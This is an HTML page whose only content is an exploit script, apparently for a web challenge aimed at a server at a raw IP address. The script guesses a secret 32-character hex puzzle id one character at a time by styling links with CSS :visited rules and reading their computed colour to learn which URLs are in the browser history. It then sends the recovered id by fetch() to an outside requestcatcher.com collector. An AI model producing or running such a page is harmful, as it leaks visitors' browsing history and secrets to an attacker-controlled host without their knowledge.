<!DOCTYPE html>
<html>
<head>
  <style id="s">a{color:black;}</style>
</head>
<body>
  <a id="a"></a>
  <script>
    (async()=>{
      const base='http://34.146.134.179:3000/puzzle?id=';
      const hex='0123456789abcdef';
      let id='';
      const a=document.getElementById('a');
      const s=document.getElementById('s');
      
      for(let pos=0;pos<32;pos++){
        let css='a{color:black;}';
        for(const c of hex){
          css+=`a[href^="${base}${id}${c}"]:visited{color:red!important;}`;
        }
        s.textContent=css;
        
        let found=false;
        for(const c of hex){
          a.href=base+id+c+'0'.repeat(31-pos);
          await new Promise(r=>requestAnimationFrame(r));
          await new Promise(r=>setTimeout(r,100));
          if(getComputedStyle(a).color==='rgb(255, 0, 0)'){
            id+=c;
            found=true;
            break;
          }
        }
        if(!found)break;
      }
      
      if(id.length>0){
        fetch(`https://singetu0096.requestcatcher.com/?found=${id}&len=${id.length}`);
      }
    })();
  </script>
</body>
</html>
